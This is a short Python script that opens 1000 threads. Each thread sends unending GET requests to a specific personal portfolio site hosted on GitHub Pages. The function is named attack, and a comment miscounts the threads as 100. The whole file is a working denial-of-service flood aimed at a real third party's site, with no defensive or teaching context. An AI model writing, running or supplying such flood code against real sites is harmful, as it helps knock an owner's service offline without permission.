import requests
import threading

url = "https://karan271106.github.io/portfoliopk/"

def attack():
    while True:
        try:
            response = requests.get(url)
            print("Request sent:", response.status_code)
        except:
            print("Request failed")

for _ in range(1000):  # 100 threads attacking
    threading.Thread(target=attack).start()
